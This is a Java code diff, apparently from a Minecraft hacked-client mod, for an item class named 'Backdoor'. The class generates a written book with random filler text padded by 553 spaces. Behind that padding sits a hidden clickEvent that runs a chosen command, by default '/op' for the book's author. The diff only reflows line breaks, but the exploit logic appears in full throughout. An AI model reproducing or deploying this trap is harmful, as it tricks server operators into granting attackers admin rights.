@@ -17,16 +17,12 @@ public class Backdoor extends Item {
     final Option<String> title = new Option<>("title", "generateForMe", String.class);
     final Option<String> content = new Option<>("content", "generateForMe", String.class);
     final Option<String> command = new Option<>("command", "generateForMe", String.class);
-    final String[] nouns = new String[] { "bird", "clock", "boy", "plastic", "duck", "teacher", "old lady", "professor",
-            "hamster", "dog" };
-    final String[] verbs = new String[] { "kicked", "ran", "flew", "dodged", "sliced", "rolled", "died", "breathed",
-            "slept", "killed" };
-    final String[] adjectives = new String[] { "beautiful", "lazy", "professional", "lovely", "dumb", "rough", "soft",
-            "hot", "vibrating", "slimy" };
-    final String[] adverbs = new String[] { "slowly", "elegantly", "precisely", "quickly", "sadly", "humbly", "proudly",
-            "shockingly", "calmly", "passionately" };
-    final String[] preposition = new String[] { "down", "into", "up", "on", "upon", "below", "above", "through",
-            "across", "towards" };
+    final String[] nouns = new String[] { "bird", "clock", "boy", "plastic", "duck", "teacher", "old lady", "professor", "hamster", "dog" };
+    final String[] verbs = new String[] { "kicked", "ran", "flew", "dodged", "sliced", "rolled", "died", "breathed", "slept", "killed" };
+    final String[] adjectives = new String[] { "beautiful", "lazy", "professional", "lovely", "dumb", "rough", "soft", "hot", "vibrating", "slimy" };
+    final String[] adverbs = new String[] { "slowly", "elegantly", "precisely", "quickly", "sadly", "humbly", "proudly", "shockingly", "calmly",
+            "passionately" };
+    final String[] preposition = new String[] { "down", "into", "up", "on", "upon", "below", "above", "through", "across", "towards" };
 
     public Backdoor() {
         super("BackdoorBook", "Makes a book that automatically runs a command when clicked viewed");
@@ -51,23 +47,20 @@ public class Backdoor extends Item {
         if (cmdStr.equals("generateForMe")) {
             cmdStr = "/op " + author;
         }
-        NbtGroup ng = new NbtGroup(new NbtProperty("title", titleStr),
-                new NbtProperty("author", author),
-                new NbtList("pages",
-                        new NbtProperty("{\"text\": \"" + contentStr + " ".repeat(553) + "\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + cmdStr + "\"}}"),
-                        new NbtProperty("{\"text\":\"\"}"),
-                        new NbtProperty("{\"text\":\"\"}")));
+        NbtGroup ng = new NbtGroup(new NbtProperty("title", titleStr), new NbtProperty("author", author), new NbtList("pages", new NbtProperty(
+                "{\"text\": \"" + contentStr + " ".repeat(553) + "\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + cmdStr + "\"}}"),
+                new NbtProperty("{\"text\":\"\"}"), new NbtProperty("{\"text\":\"\"}")));
         ItemStack s = new ItemStack(Items.WRITTEN_BOOK);
         s.setNbt(ng.toCompound());
         return s;
     }
 
     String getRandomContent() {
-        return "The " + adjectives[random(adjectives.length)] + " " + nouns[random(nouns.length)] + " " + adverbs[random(
-                adverbs.length)] + " " + verbs[random(verbs.length)] + " because some " + nouns[random(nouns.length)] + " " + adverbs[random(
-                adverbs.length)] + " " + verbs[random(verbs.length)] + " " + preposition[random(preposition.length)] + " a " + adjectives[random(
-                adjectives.length)] + " " + nouns[random(nouns.length)] + " which, became a " + adjectives[random(
-                adjectives.length)] + ", " + adjectives[random(adjectives.length)] + " " + nouns[random(nouns.length)] + ".";
+        return "The " + adjectives[random(adjectives.length)] + " " + nouns[random(nouns.length)] + " " + adverbs[random(adverbs.length)] + " " + verbs[random(
+                verbs.length)] + " because some " + nouns[random(nouns.length)] + " " + adverbs[random(adverbs.length)] + " " + verbs[random(
+                verbs.length)] + " " + preposition[random(preposition.length)] + " a " + adjectives[random(adjectives.length)] + " " + nouns[random(
+                nouns.length)] + " which, became a " + adjectives[random(adjectives.length)] + ", " + adjectives[random(
+                adjectives.length)] + " " + nouns[random(nouns.length)] + ".";
     }
 
     String getRandomTitle() {
